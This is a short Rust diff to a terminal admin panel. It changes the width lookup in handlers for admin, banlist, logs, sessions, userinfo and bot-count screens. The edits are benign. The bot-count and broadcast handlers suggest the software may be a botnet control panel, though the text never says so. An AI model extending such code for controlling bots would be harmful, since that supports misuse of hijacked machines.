@@ -8,7 +8,7 @@ use super::general::show_prompt;
 
 pub async fn handle_admin_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let width = get_terminal_width();
+    let width = get_terminal_width(state).await;
     let side_width = 30;
     let main_width = width - side_width - 2;
     let left_col_width = 37;
@@ -231,7 +231,7 @@ pub async fn handle_banlist_command(client: &Arc<Client>, state: &Arc<AppState>)
     
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     
-    let width = get_terminal_width();
+    let width = get_terminal_width(state).await;
     let side_width = 30;
     let main_width = width - side_width - 2;
     
@@ -304,7 +304,7 @@ pub async fn handle_broadcast_command(client: &Arc<Client>, state: &Arc<AppState
 pub async fn handle_logs_command(client: &Arc<Client>, state: &Arc<AppState>, lines: usize) -> Result<()> {
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     
-    let width = get_terminal_width();
+    let width = get_terminal_width(state).await;
     let side_width = 30;
     let main_width = width - side_width - 2;
     
@@ -376,7 +376,7 @@ pub async fn handle_sessions_command(client: &Arc<Client>, state: &Arc<AppState>
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     let clients = state.client_manager.get_all_clients().await;
     
-    let width = get_terminal_width();
+    let width = get_terminal_width(state).await;
     let side_width = 30;
     let main_width = width - side_width - 2;
     
@@ -460,7 +460,7 @@ pub async fn handle_userinfo_command(client: &Arc<Client>, state: &Arc<AppState>
     if let Ok(Some(user)) = state.user_manager.get_user(&username).await {
         client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
         
-        let width = get_terminal_width();
+        let width = get_terminal_width(state).await;
         let side_width = 30;
         let main_width = width - side_width - 2;
         
@@ -538,7 +538,7 @@ pub async fn handle_botcount_command(client: &Arc<Client>, state: &Arc<AppState>
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     let bot_count = state.bot_manager.get_bot_count().await;
     
-    let width = get_terminal_width();
+    let width = get_terminal_width(state).await;
     let side_width = 30;
     let main_width = width - side_width - 2;
     
